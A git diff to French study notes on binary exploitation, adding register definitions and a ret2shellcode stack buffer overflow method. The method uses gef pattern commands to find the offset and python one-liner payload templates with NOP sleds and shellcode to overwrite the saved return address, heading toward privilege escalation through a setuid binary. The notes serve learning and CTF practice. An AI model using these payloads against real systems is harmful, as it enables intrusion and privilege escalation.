@@ -3,6 +3,9 @@
 Voir [Reverse](../reverse)
 
 - https://beta.hackndo.com/rappels-d-architecture/
+- https://beta.hackndo.com/assembly-basics/
+- https://beta.hackndo.com/stack-introduction/
+- https://beta.hackndo.com/buffer-overflow/
 - https://fr.wikibooks.org/wiki/Fonctionnement_d'un_ordinateur
 
 ## Doc :
@@ -269,24 +272,68 @@ objcopy -O binary -K shellcode shellcode.o shellcode.bin
 
 [ret2shellcode](./shellcode)
 
+*Registres*
+
+**ebp** = base pointer
+**esp** = save pointer
+**eip** = instruction pointer (pointe vers la prochaine instruction)
+
+*Memoire*
+
+**saved ebp** = (mémoire) sauvegarde du caller ebp (base de la frame) sur la stack
+**saved eip** = (mémoire) sauvegarde du caller eip (addresse de retour) sur la stack
+
+*Instruction*
+
+**ret** = `pop eip; jmp` = instruction permettant de mettre eip = &saved eip et d'éxécuter le code contenu à saved eip
+
+Le but est donc :
+
+-1) de contrôler saved eip
+-2) d'atteindre le ret afin d'éxécuter le shellcode qu'on placera à partir de seip
+
 #### Technique plus simples (pas de calcul pour les NOP)
 
 ![frames](./stack_frames.png)
 
-- *Find Offset (eip = return address)* (`msf-pattern_create -t 100` puis `msf-pattern_offset -q <contenu eip>`)
+- *Find Offset (eip = return address)*
+
+```bash
+gef -q ./vuln
+pattern create 500
+
+# break main
+run # adapt arguments
+info frame 
+
+x/4s <addresse saved eip>
+pattern search <contenu saved eip>
+```
 
 - *Find Shellcode Address*
-	- *using previous esp (procedure n-1) in gdb* : `b *main; r $(python -c 'print('A'*<offset_eip>); print $esp`
+	- *using previous esp (procedure n-1) in gdb* : `b *main; r $(python -c 'print('A'*<offset_seip>)`
 	- *using environment*: `export LOGNAME = $(python -c "print('\x90'*100 + <shellcode>")` and use [./getenv LOGNAME](./getenv.c)
 
 - Go to shell-storm 
 
 - Exploit
 
+![](./shellcode1.png)
+
 ```bash
-./vuln $(python -c "print('A'*<offset_eip> + <addresse previous esp> + '\x90'*100 + <shellcode>
+./vuln $(python -c "print('A'*<offset_seip> + <addresse previous esp> + '\x90'*100 + <shellcode>
+```
+
+```
+# environment variant
+./vuln $(python -c "print('A'*<offset_seip> + <environment_address_var>)"
+```
+
+![](./shellcode2.png)
+
+```
 # OR
-./vuln $(python -c "print('A'*<offset_eip> + <environment_address_var>)"
+./vuln $(python -c "print('\x90' + <shellcode> + <addr_seip>)")
 ```
 
 #### Gagner les privileges  - uid du binaire
